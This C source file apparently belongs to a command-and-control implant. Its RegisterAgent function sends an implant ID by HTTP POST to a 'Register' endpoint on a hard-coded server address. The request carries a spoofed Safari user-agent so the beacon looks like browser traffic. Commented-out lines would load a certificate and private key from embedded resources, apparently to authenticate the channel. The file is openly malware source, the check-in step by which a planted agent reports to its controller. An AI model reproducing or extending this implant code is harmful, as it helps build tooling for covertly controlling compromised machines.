#include "Http.h"
#include "implant.h"
#include "LoadResource.h"

BOOL RegisterAgent() {
	Agent	new_agent		= { 0 };
	LPCWSTR UserAgent		= L"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1";
	LPCWSTR HttpEndpoint	= L"Register";
	LPCWSTR HttpServer		= L"127.0.0.1";
	LPCWSTR RequestHeaders	= L"Content-Type: application/x-www-form-urlencoded";
	LPCSTR DataBuf			= "implant_id=12345678";
	DWORD	DataLen			= lstrlenA(DataBuf);


	//PCCERT_CONTEXT CertContext = { 0 };
	//BYTE* KeyData;
//	CertContext = LoadCertificateFromResource(GetModuleHandleW(NULL), 102);
//	KeyData = LoadPrivateKeyFromResource(GetModuleHandleW(NULL), 106);

//	CRYPT_KEY_PROV_INFO KeyProvInfo;

//	if (!CertSetCertificateContextProperty(CertContext, CERT_KEY_CONTEXT_PROP_ID, 0, KeyData)) {
//		printf("Failed to set private key information: [%08x]\n", GetLastError());
//		return -1;
//	}
	PerformRequest(UserAgent, HttpEndpoint, HttpServer, DataBuf, DataLen, RequestHeaders);
	
	return 1;
}
